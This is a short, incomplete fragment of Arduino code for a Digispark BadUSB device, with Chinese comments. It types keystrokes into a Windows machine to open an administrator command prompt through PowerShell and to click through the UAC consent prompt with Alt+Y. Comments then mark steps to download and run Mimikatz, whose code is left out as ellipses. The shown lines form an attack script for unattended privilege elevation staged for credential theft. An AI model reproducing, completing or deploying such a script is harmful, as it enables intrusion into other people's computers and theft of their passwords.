...
DigiKeyboard.sendKeyPress(MOD_SHIFT_LEFT); // 按住左SHIFT，绕过输入法 DigiKeyboard.println("powershell Start-Process cmd -Verb runAs"); DigiKeyboard.sendKeyPress(0); // 松开 DigiKeyboard.sendKeyStroke(KEY_ENTER); // 按回车 
DigiKeyboard.delay(3000); 
DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); 
DigiKeyboard.delay(1000); // 下载Mimikatz 
...
DigiKeyboard.delay(5000); // 运行Mimikatz 
DigiKeyboard.sendKeyPress(MOD_SHIFT_LEFT); 
